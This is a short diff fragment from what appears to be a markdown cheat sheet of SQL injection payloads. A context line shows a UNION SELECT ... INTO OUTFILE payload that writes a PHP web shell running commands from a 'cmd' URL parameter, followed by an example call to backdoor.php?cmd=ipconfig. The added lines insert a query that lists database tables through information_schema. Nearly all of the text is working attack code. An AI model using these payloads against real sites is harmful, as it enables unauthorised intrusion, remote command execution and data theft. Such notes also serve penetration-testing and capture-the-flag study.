@@ -35,5 +35,7 @@ union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'pa
 ----
 (ip/backdoor.php?cmd=ipconfig)
 ```
-
+```
+SELECT table_name FROM information_schema.tables WHERE table_schema=database() and table_name LIKE 'w%'
+```
 
